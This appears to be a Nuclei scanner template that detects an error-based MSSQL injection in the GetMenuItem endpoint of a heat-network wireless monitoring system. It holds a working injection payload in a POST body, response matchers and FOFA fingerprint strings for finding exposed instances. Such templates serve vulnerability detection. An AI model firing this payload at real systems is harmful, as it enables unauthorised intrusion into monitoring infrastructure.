id: poc-yaml-rewang-wireless-monitoring-system-getmenuitem-sqli
info:
  name: 热网无线监测系统 GetMenuItem SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 热网无线监测系统
    fofa:
      - body="Downloads/HDPrintInstall.rar"
      - body="skins/login/images/btn_login.jpg"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/DataSrvs/UCCGSrv.asmx/GetMenuItem"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "name=1') AND 1234 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))-- +"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "在将 nvarchar 值 "
          - "转换成数据类型 int 时失败"
          - "0x{{t2}}"
        condition: and
